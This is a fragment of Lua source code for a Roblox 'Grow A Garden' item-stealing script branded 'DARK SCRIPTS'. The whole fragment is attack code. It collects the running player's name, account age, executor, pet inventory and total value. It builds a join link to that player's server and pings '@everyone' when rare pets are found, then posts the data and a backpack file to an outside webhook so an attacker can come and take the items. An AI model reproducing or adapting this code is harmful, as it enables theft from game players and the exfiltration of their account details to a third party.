if petString ~= "" then
    local embed = {
        title = "üåµ Grow A Garden Hit - DARK SCRIPTS üçÄ",
        color = 65280,
        fields = {
            {
                name = "üë§ Player Information",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", Players.LocalPlayer.DisplayName or "Unknown", Username or "Unknown", detectExecutor() or "Unknown", tostring(Players.LocalPlayer.AccountAge or 0)),
                inline = false
            },
            {
                name = "üí∞ Total Value",
                value = string.format("```%s```", formattedTotalValue),
                inline = false
            },
            {
                name = "üå¥ Backpack",
                value = string.format("```%s```", truncateByLines(petString, 20)),
                inline = false
            },
            {
                name = "üèùÔ∏è Join Server",
                value = "[click here to join](" .. Fern .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local payload = {
        content = (hasRarePets() and "--@everyone\n" or "") .. string.format("\n%s\n", tpScript or "N/A"),
        embeds = {embed}
    }

    local fullBackpackString = ""
    for _, pet in ipairs(pets) do
        local highestPriority = 99
        local chosenEmoji = "üê∂"
        local mutation = isMutated(pet.PetName)
        local mutationData = mutation and PetPriorityData[mutation] or nil
        local petData = PetPriorityData[pet.Type] or nil

        if petData and petData.priority < highestPriority then
            highestPriority = petData.priority
            chosenEmoji = petData.emoji
        elseif mutationData and mutationData.priority < highestPriority then
            highestPriority = mutationData.priority
            chosenEmoji = mutationData.emoji
        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
            highestPriority = 12
            chosenEmoji = "üêò"
        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
            highestPriority = 13
            chosenEmoji = "üë¥"
        end

        if not OnlyPriorityPets or (petData and petData.priority <= MinPriorityThreshold) or (mutationData and mutationData.priority <= MinPriorityThreshold) then
            local petName = pet.PetName
            local petValue = pet.Formatted
            fullBackpackString = fullBackpackString .. chosenEmoji .. " - " .. petName .. " -> " .. petValue .. "\n"
        end
    end

    local boundary = "------------------------" .. HttpService:GenerateGUID(false)
    local embedPayload = HttpService:JSONEncode(payload)
    local body = {}
    table.insert(body, "--" .. boundary)
    table.insert(body, 'Content-Disposition: form-data; name="payload_json"')
    table.insert(body, "")
    table.insert(body, embedPayload)
    table.insert(body, "--" .. boundary)
    table.insert(body, 'Content-Disposition: form-data; name="file"; filename="items.txt"')
    table.insert(body, "Content-Type: text/plain")
    table.insert(body, "")
    table.insert(body, fullBackpackString)
    table.insert(body, "--" .. boundary .. "--")
    local requestBody = table.concat(body, "\r\n")

    local success, err = pcall(function()
        request({
            Url = Webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
            },
            Body = requestBody
        })
    end)
    if not success then
        warn("Webhook request failed: " .. tostring(err))
    end
end
